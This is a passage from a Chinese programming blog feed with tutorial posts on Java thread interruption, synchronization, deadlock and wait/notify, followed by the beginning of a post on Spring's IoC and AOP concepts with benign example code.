class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - about to sleep for 20 seconds"</span>);</span><br><span class="line">            Thread.sleep(<span class="number">20000</span>);</span><br><span class="line">            System.out.println(<span class="string">"in run() - woke up"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - interrupted while sleeping"</span>);</span><br><span class="line">            <span class="comment">//处理完中断异常后，返回到run（）方法人口，</span></span><br><span class="line">            <span class="comment">//如果没有return，线程不会实际被中断，它会继续打印下面的信息</span></span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in run() - leaving normally"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SleepInterrupt si = <span class="keyword">new</span> SleepInterrupt();</span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(si);</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="comment">//主线程休眠2秒，从而确保刚才启动的线程有机会执行一段时间</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>); </span><br><span class="line">        &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in main() - interrupting other thread"</span>);</span><br><span class="line">        <span class="comment">//中断线程t</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"in main() - leaving"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203100807812.jpg" alt="" /></p><p>主线程启动新线程后，自身休眠2秒钟，允许新线程获得运行时间。新线程打印信息“about to sleep for 20 seconds”后，继而休眠20秒钟，大约2秒钟后，main线程通知新线程中断，那么新线程的20秒的休眠将被打断，从而抛出InterruptException异常，执行跳转到catch块，打印出“interrupted while sleeping”信息，并立即从run（）方法返回，然后消亡，而不会打印出catch块后面的“leaving normally”信息。</p><p><strong>注意：如果将catch块中的return语句注释掉，则线程在抛出异常后，会继续执行，而不会中断，从而打印出”leaving normally“信息。</strong></p><h3 id="待决中断"><a class="markdownIt-Anchor" href="#待决中断"></a> 待决中断</h3><p>上面的例子中断是在sleep()方法之后调用的，它会相当友好地终止线程，并抛出InterruptedException异常。如果在调用sleep()方法前被中断，则该中断被称为<code>待决中断</code>，它会在调用sleep()方法时，立即出InterruptedException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PendingInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果输入了参数，则在mian线程中中断当前线程（亦即main线程）</span></span><br><span class="line">        <span class="keyword">if</span>(args.length &gt; <span class="number">0</span> )&#123;</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//获取当前时间</span></span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算中间代码执行的时间</span></span><br><span class="line">        System.out.println(<span class="string">"elapsedTime="</span> + (System.currentTimeMillis() - startTime));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203104020671.jpg" alt="" /></p><h3 id="使用isinterrupted方法判断中断状态"><a class="markdownIt-Anchor" href="#使用isinterrupted方法判断中断状态"></a> 使用isInterrupted()方法判断中断状态</h3><p>可以在Thread对象上调用isInterrupted()方法来检查任何线程的中断状态。这里需要注意：线程一旦被中断，isInterrupted()方法便会返回true，而一旦sleep()方法抛出异常，它将清空中断标志，此时isInterrupted()方法将返回false。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptCheck</span> <span class="keyword">extends</span> <span class="title">Object</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Thread t = Thread.currentThread();</span><br><span class="line">        System.out.println(<span class="string">"Point A: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        <span class="comment">//待决中断，中断自身</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"Point B: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        System.out.println(<span class="string">"Point C: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>( InterruptedException x)&#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//抛出异常后，会清除中断标志，这里会返回false</span></span><br><span class="line">        System.out.println(<span class="string">"Point D: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203112444531.jpg" alt="" /></p><h3 id="使用threadinterrupted方法判断中断标志位"><a class="markdownIt-Anchor" href="#使用threadinterrupted方法判断中断标志位"></a> 使用Thread.interrupted()方法判断中断标志位</h3><p>可以使用Thread.interrupted()方法来检查当前线程的中断状态(并隐式重置为false)，由于该方法是静态方法，因此不能在特定的线程下使用，而只能报告调用它的线程的中断状态，如果线程被中断，而且中断状态尚不清楚，那么，这个方法返回true。与isInterrupted()不同，它将自动重置中断状态为false，第二次调用Thread.interrupted()方法，总是返回false，除非中断了线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptReset</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point X: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Y: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Z: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203142219015.jpg" alt="" /></p><p><strong>补充：</strong></p><ol><li>join()方法用线程对象调用，如果一个线程A中调用另一个线程B的join方法，线程A会等待线程B执行完毕后再执行。</li><li>yield方法直接使用Thread类调用，yield让出CPU执行权限，再重新竞争CPU的执行权，如果没有比它优先级高的线程，则依旧不会有变化。</li></ol><h2 id="线程挂起-恢复与终止的方法"><a class="markdownIt-Anchor" href="#线程挂起-恢复与终止的方法"></a> 线程挂起、恢复与终止的方法</h2><p><a href="http://www.importnew.com/20539.html" target="_blank" rel="noopener">Java并发编程（3）：线程挂起、恢复与终止的正确方法（含代码）</a></p><h2 id="守护线程与线程阻塞"><a class="markdownIt-Anchor" href="#守护线程与线程阻塞"></a> 守护线程与线程阻塞</h2><h3 id="守护线程"><a class="markdownIt-Anchor" href="#守护线程"></a> 守护线程</h3><p><strong>注意：</strong></p><ol><li>setDaemon(true)必须在调用线程的start()方法之前设置，否则会跑出IllegalThreadStateException异常。</li><li>在守护线程中产生的新线程也是守护线程。</li><li>不要认为所有的应用都可以分配给守护线程来进行服务，比如读写操作或者计算逻辑。</li></ol><h3 id="线程阻塞"><a class="markdownIt-Anchor" href="#线程阻塞"></a> 线程阻塞</h3><p><img src="https://upload-images.jianshu.io/upload_images/4470227-ab4c376926c90157.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线程阻塞的情况" /></p><p><strong>注意：不是所有的阻塞都是可中断的，以上阻塞状态的前两种可中断，后面两张不可以中断。</strong></p><h2 id="volatile变量修饰符"><a class="markdownIt-Anchor" href="#volatile变量修饰符"></a> volatile变量修饰符</h2><p>Java语言规范中指出：为了获得最佳速度，允许线程保存共享成员变量的私有拷贝，而且只当线程进入或者离开同步代码块时才将私有拷贝与共享内存中的原始值进行比较。</p><p>这样当多个线程同时与某个对象交互时，就必须注意到要让线程及时的得到共享成员变量的变化。而volatile关键字就是提示JVM：对于这个成员变量，不能保存它的私有拷贝，而应直接与共享成员变量交互。</p><p>volatile是一种稍弱的同步机制，在访问volatile变量时不会执行加锁操作，也就不会执行线程阻塞，因此volatilei变量是一种比synchronized关键字更轻量级的同步机制。</p><p>使用建议：在两个或者更多的线程需要访问的成员变量上使用volatile。当要访问的变量已在synchronized代码块中，或者为常量时，没必要使用volatile。<br />由于使用volatile屏蔽掉了JVM中必要的代码优化，所以在效率上比较低，因此一定在必要时才使用此关键字。</p><p><a href="http://www.importnew.com/20566.html" target="_blank" rel="noopener">有一个案例分析</a></p><h2 id="runnable和thread实现多线程的区别"><a class="markdownIt-Anchor" href="#runnable和thread实现多线程的区别"></a> Runnable和Thread实现多线程的区别</h2><p>Java实现多线程的方法：继承Thread类、实现Runnable接口、实现Callable接口。在程序开发中，一般用Runnable接口为主，优势如下：<br /><img src="https://upload-images.jianshu.io/upload_images/4470227-c0c19b294153e96c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Runnable的优势.png" /></p><p>以下是两个程序的对比:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094239437.jpg" alt="" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyThread my = <span class="keyword">new</span> MyThread();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094642328.jpg" alt="" /></p><p><strong>补充：</strong></p><ol><li>在第二种方法中，输出无法预测，因为ticket-不是原子操作</li><li>在第一种方法中，我们new了3个Thread对象，即三个线程分别执行三个对象中的代码，因此便是三个线程去独立地完成卖票的任务；而在第二种方法中，我们同样也new了3个Thread对象，但只有一个Runnable对象，3个Thread对象共享这个Runnable对象中的代码，因此，便会出现3个线程共同完成卖票任务的结果。如果我们new出3个Runnable对象，作为参数分别传入3个Thread对象中，那么3个线程便会独立执行各自Runnable对象中的代码，即3个线程各自卖5张票。</li><li>在第二种方法中，由于3个Thread对象共同执行一个Runnable对象中的代码，因此可能会造成线程的不安全，比如可能ticket会输出-1（如果我们System.out….语句前加上线程休眠操作，该情况将很有可能出现），这种情况的出现是由于，一个线程在判断ticket为1&gt;0后，还没有来得及减1，另一个线程已经将ticket减1，变为了0，那么接下来之前的线程再将ticket减1，便得到了-1。这就需要加入同步操作（即互斥锁），确保同一时刻只有一个线程在执行每次for循环中的操作。而在第一种方法中，并不需要加入同步操作，因为每个线程执行自己Thread对象中的代码，不存在多个线程共同执行同一个方法的情况。</li></ol><h2 id="使用synchronized获取互斥锁"><a class="markdownIt-Anchor" href="#使用synchronized获取互斥锁"></a> 使用synchronized获取互斥锁</h2><p>在并发编程中，多线程同时并发访问的资源叫做临界资源，当多个线程同时访问对象并要求操作相同资源时，分割了原子操作就有可能出现数据的不一致或数据不完整的情况，为避免这种情况的发生，我们会采取同步机制，以确保在某一时刻，方法内只允许有一个线程。</p><p>采用synchronized修饰符实现的同步机制叫做互斥锁机制，它所获得的锁叫做互斥锁。每个对象都有一个monitor(锁标记)，当线程拥有这个锁标记时才能访问这个资源，没有锁标记便进入锁池。任何一个对象系统都会为其创建一个互斥锁，这个锁是为了分配给线程的，防止打断原子操作。每个对象的锁只能分配给一个线程，因此叫做互斥锁。</p><p>下面是几点说明：</p><ol><li>如果同一个方法内同时有两个或更多线程，则每个线程有自己的局部变量拷贝。</li><li>类的每个实例都有自己的对象级别锁。当一个线程访问实例对象中的synchronized同步代码块或同步方法时，该线程便获取了该实例的对象级别锁，其他线程这时如果要访问synchronized同步代码块或同步方法，便需要阻塞等待，直到前面的线程从同步代码块或方法中退出，释放掉了该对象级别锁。</li><li>访问同一个类的不同实例对象中的同步代码块，不存在阻塞等待获取对象锁的问题，因为它们获取的是各自实例的对象级别锁，相互之间没有影响。</li><li>持有一个对象级别锁不会阻止该线程被交换出来，也不会阻塞其他线程访问同一示例对象中的非synchronized代码。当一个线程A持有一个对象级别锁（即进入了synchronized修饰的代码块或方法中）时，线程也有可能被交换出去，此时线程B有可能获取执行该对象中代码的时间，但它只能执行非同步代码（没有用synchronized修饰），当执行到同步代码时，便会被阻塞，此时可能线程规划器又让A线程运行，A线程继续持有对象级别锁，当A线程退出同步代码时（即释放了对象级别锁），如果B线程此时再运行，便会获得该对象级别锁，从而执行synchronized中的代码。</li><li>持有对象级别锁的线程会让其他线程阻塞在所有的synchronized代码外。例如，在一个类中有三个synchronized方法a，b，c，当线程A正在执行一个实例对象M中的方法a时，它便获得了该对象级别锁，那么其他的线程在执行同一实例对象（即对象M）中的代码时，便会在所有的synchronized方法处阻塞，即在方法a，b，c处都要被阻塞，等线程A释放掉对象级别锁时，其他的线程才可以去执行方法a，b或者c中的代码，从而获得该对象级别锁。</li><li>使用synchronized（obj）同步语句块，可以获取指定对象上的对象级别锁。obj为对象的引用，如果获取了obj对象上的对象级别锁，在并发访问obj对象时时，便会在其synchronized代码处阻塞等待，直到获取到该obj对象的对象级别锁。当obj为this时，便是获取当前对象的对象级别锁。</li><li>类级别锁被特定类的所有示例共享，它用于控制对static成员变量以及static方法的并发访问。具体用法与对象级别锁相似。</li><li>互斥是实现同步的一种手段，临界区、互斥量和信号量都是主要的互斥实现方式。synchronized关键字经过编译后，会在同步块的前后分别形成monitorenter和monitorexit这两个字节码指令。根据虚拟机规范的要求，在执行monitorenter指令时，首先要尝试获取对象的锁，如果获得了锁，把锁的计数器加1，相应地，在执行monitorexit指令时会将锁计数器减1，当计数器为0时，锁便被释放了。由于synchronized同步块对同一个线程是可重入的，因此一个线程可以多次获得同一个对象的互斥锁，同样，要释放相应次数的该互斥锁，才能最终释放掉该锁。</li></ol><h2 id="多线程环境下安全使用集合api"><a class="markdownIt-Anchor" href="#多线程环境下安全使用集合api"></a> 多线程环境下安全使用集合API</h2><p><a href="http://www.importnew.com/20624.html" target="_blank" rel="noopener">Java并发编程（8）：多线程环境中安全使用集合API（含代码）</a></p><h2 id="死锁"><a class="markdownIt-Anchor" href="#死锁"></a> 死锁</h2><p>线程A当前持有互斥所锁lock1，线程B当前持有互斥锁lock2。接下来，当线程A仍然持有lock1时，它试图获取lock2，因为线程B正持有lock2，因此线程A会阻塞等待线程B对lock2的释放。如果此时线程B在持有lock2的时候，也在试图获取lock1，因为线程A正持有lock1，因此线程B会阻塞等待A对lock1的释放。二者都在等待对方所持有锁的释放，而二者却又都没释放自己所持有的锁，这时二者便会一直阻塞下去。这种情形称为死锁。</p><p>下面介绍避免死锁的几种常见方法：</p><ol><li>避免一个线程获取多个锁</li><li>避免一个线程在锁内同时占用多个资源，尽量保证每个锁只占用一个资源</li><li>尝试使用定时锁，使用lock.tryLock(timeout)来代替使用内部锁机制</li><li>对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况</li></ol><h2 id="使用waitnotifynotifyall实现线程间通信"><a class="markdownIt-Anchor" href="#使用waitnotifynotifyall实现线程间通信"></a> 使用wait/notify/notifyAll实现线程间通信</h2><p>在Java中，可以通过配合调用Object对象的wait()方法和notify()方法或notifyAll()方法来实现线程间的通信。在线程中调用wait()方法，将阻塞等待其他线程的通知（其他线程调用notify()方法或notifyAll()方法），在线程中调用notify()方法或notifyAll()方法，将通知其他线程从wait()方法处返回。</p><p>Object是所有类的超类，它有5个方法组成了等待/通知机制的核心：notify()、notifyAll()、wait()、wait(long)和wait(long, int)。在Java中，所有的类都从Object继承而来，因此，所有的类都拥有这些共有方法可供使用。而且，由于他们都被声明为final，因此在子类中不能覆写任何一个方法。</p><p><strong>注意：</strong></p><ol><li>如果线程调用了对象的wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。</li><li>当有线程调用了对象的notifyAll()方法（唤醒所有wait线程）或notify()方法（只随机唤醒一个wait线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。</li><li>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了synchronized代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 并发编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring的IOC与AOP特性</title>
      <link href="/ioc-and-aop/"/>
      <url>/ioc-and-aop/</url>
      
        <content type="html"><![CDATA[<h2 id="spring的ioc特性"><a class="markdownIt-Anchor" href="#spring的ioc特性"></a> Spring的IOC特性</h2><h3 id="什么是控制反转"><a class="markdownIt-Anchor" href="#什么是控制反转"></a> 什么是控制反转</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-a8f81355f8c40277.jpg" alt="图1. 控制反转" /></p><p>见图1，软件中的对象就如同图中的齿轮，协同工作，互相耦合，若是一个零件不能正常工作，则会导致整个系统的奔溃，这就是强耦合系统。为了解决对象间耦合度过高的问题，软件专家Michael Mattson提出了IoC理论。</p><p>控制反转(Inversion of Control)是一种面向对象编程中的一种设计原则，用来解决计算机代码之间的耦合度。其基本思想是：借助于&quot;第三方&quot;实现具有依赖关系的对象之间的耦合。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-581580a9c05886ea.jpg" alt="图2. IoC" /></p><p>见图2，由于引进了IoC容器，使得A、B、C、D这四个对象没有了耦合关系，对象的控制权全部由IoC容器负责。</p><p>我们再次来对比一下：</p><ol><li>软件系统在没有引入IoC容器之前，如图1，对象A依赖与对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。</li><li>软件系统在引入IoC容器之后，就完全不同了。如图2，由于IoC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要B的对象，IoC容器会主动创建一个对象B注入到对象A需要的地方。</li></ol><p>通过对比，可以看出对象A依赖对象B的过程，由主动行为变成了被动行为，控制权颠倒了过来，这就是&quot;控制反转&quot;的由来。</p><h3 id="什么是依赖注入"><a class="markdownIt-Anchor" href="#什么是依赖注入"></a> 什么是依赖注入</h3><p>当A对象需要调用B对象方法时，这种情况在Spring中称为依赖，即A对象依赖B对象，Spring把互相调用的关系称为依赖关系。</p><p>在传统模式下当需要调用其他对象的方法时，一般有以下两种方式：</p><ul><li>原始做法：调用者主动创建被依赖对象，然后再调用被依赖对象的方法。</li><li>简单工厂模式：调用者先找到被依赖对象的工厂，然后主动通过工厂去获取被依赖对象，最后再调用被依赖对象的方法。</li></ul><p>对于第一种方式，由于调用者需要通过形如&quot;new 被依赖对象构造器();&quot;的代码来创建对象，这种方式会导致调用者与被依赖对象实现类的硬编码耦合，不利于项目升级维护。</p><p>对于第二种方式，要把握一下三点：</p><ul><li>调用者面向被依赖对象的接口编程</li><li>将被依赖对象的创建交给工厂完成</li><li>调用者通过工厂来获得被依赖组件</li></ul><p>这样，调用者只需与被依赖对象的接口耦合，这样就避免了类层次的硬编码耦合。缺点是，调用组件需要主动通过工厂去获取被依赖对象，这就会带来调用组件与被依赖对象的耦合。</p><p>当使用Spring容器后，程序无须使用new调用构造器去创建对象，所有的Java对象都可交给Spring容器去创建；当调用者需要被依赖对象的方法时，调用者无须主动获取被依赖对象，只需要等待Spring容器注入即可。</p><h3 id="控制反转与依赖注入的关系"><a class="markdownIt-Anchor" href="#控制反转与依赖注入的关系"></a> 控制反转与依赖注入的关系</h3><ul><li>控制反转是一种思想</li><li>依赖注入是一种设计模式</li></ul><p>IoC框架使用依赖注入作为实现控制反转的方式，但是控制反转还有其他的实现方式，例如说ServiceLocator，所以不能将控制反转和依赖注入等同。</p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr /><ul><li><a href="http://blog.xiaohansong.com/2015/10/21/IoC-and-DI/" target="_blank" rel="noopener">《控制反转（IoC）与依赖注入（DI）》</a></li><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li></ul><h2 id="spring的aop特性"><a class="markdownIt-Anchor" href="#spring的aop特性"></a> Spring的AOP特性</h2><p><em>以下内容来自于博客<a href="https://www.ibm.com/developerworks/cn/java/j-lo-springaopcglib/index.html" target="_blank" rel="noopener">Spring AOP 实现原理与 CGLIB 应用</a></em></p><p>AOP（Aspect Orient Programming）,作为面向对象编程的一种补充，广泛应用于处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等。AOP实现的关键就在于AOP框架自动创建的AOP代理，AOP代理则可分为静态代理和动态代理两大类，其中静态代理是指AOP框架提供的命令进行编译，从而在编译阶段就可生成AOP代理类，因此也被称为编译时增强；而动态代理则是在运行时借助于JDK动态代理、CGLIB等在内存中“临时”生成AOP动态代理类，因此也被称为运行时增强。</p><h3 id="aop的存在价值"><a class="markdownIt-Anchor" href="#aop的存在价值"></a> AOP的存在价值</h3><p>在传统的OOP编程里以对象为核心，整个软件系统由一系列相互依赖的对象组成，而这些对象将被抽象成一个个类，并允许使用类继承来管理类与类之间一般到特殊的关系。随着软件规模的增大，应用的逐渐升级，慢慢出现了一些OOP很难解决的问题。</p><p>我们可以通过分析、抽象出一系列具有一定属性与行为的对象，并通过这些对象的协作来形成一个完整的软件功能。由于对象可以继承，因此我们可以把具有相同功能或相同特性的属性抽象到一个层次分明的类结构体系中。随着软件规范的不断扩大，专业化分工越来越系列，以及OOP应用实践的不断增多，随之也暴露出了一些OOP无法很好解决的问题。</p><p>现在假设系统中有3段完全相似的代码，这些代码通常会采用“复制”、“粘贴”方式来完成，通过这种“复制”、“粘贴”方式开发出来的软件如图3所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-508a18311f425fbf.jpg" alt="图3. 多个地方包含相同代码的软件" /></p><p>看到如图3所示的示意图，可以看到了这种设计的不足之处。当有一天，图1中的深色代码段需要修改，那是不是要打开3个地方的代码进行修改？如果不是3个地方包含这段代码，而是100个地方，甚至是1000个地方包含这段代码段，那会是什么后果？</p><p>为了解决这个问题，我们通常会采用将如图3所示的深色代码部分定义成一个方法，然后在3个代码段中分别调用该方法即可。在这种方式下，软件系统的结构如图4所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-b6306a904bb675ae.jpg" alt="图4. 通过方法调用实现系统功能" 